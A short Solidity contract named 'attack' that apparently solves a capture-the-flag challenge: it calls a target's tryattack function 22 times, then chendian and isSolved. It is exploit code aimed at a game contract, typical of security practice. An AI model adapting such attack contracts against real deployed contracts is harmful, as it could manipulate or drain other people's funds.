pragma solidity 0.6.0;

interface adventure {
    function chendian() external;
    function tryattack() external;
    function isSolved() external;
}

contract attack {
    adventure adv;
    constructor(address addr) public {
        adv = adventure(addr);
    }
    function hack() external {
        for(uint i; i < 22; i++) {
            adv.tryattack();
        }
        adv.chendian();
        adv.isSolved();
    }
}